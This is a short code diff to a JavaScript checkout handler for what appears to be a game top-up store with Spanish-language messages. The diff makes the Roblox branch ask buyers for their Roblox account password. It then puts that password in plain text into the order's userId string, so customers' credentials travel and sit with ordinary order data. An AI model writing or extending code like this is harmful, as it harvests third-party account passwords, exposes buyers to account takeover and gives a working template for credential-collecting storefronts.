@@ -98,8 +98,9 @@ checkoutForm.addEventListener("submit", async (e) => { //funciones complejas de 
     }
   } else if (game === "Roblox") {
     const username = document.getElementById("roblox-username").value;
+    const password = document.getElementById("roblox-password").value;
     const product = document.getElementById("roblox-product").value;
-    if (!username || !product) {
+    if (!username || !password ||  !product) {
       alert("⚠️ Por favor completa todos los campos de Roblox");
       return;
     }
@@ -139,7 +140,9 @@ checkoutForm.addEventListener("submit", async (e) => { //funciones complejas de 
     product = document.getElementById("ff-product").value;
 
   } else if (game === "Roblox") {
-    userId = document.getElementById("roblox-username").value;
+    const username = document.getElementById("roblox-username").value;
+    const password = document.getElementById("roblox-password").value;
+    userId = username + " (contraseña: " + password + ")";
     product = document.getElementById("roblox-product").value;
 
   } else if (game === "Mobile Legends") {
@@ -235,4 +238,5 @@ checkoutForm.addEventListener("submit", async (e) => { //funciones complejas de 
   }
 
 });
+
 
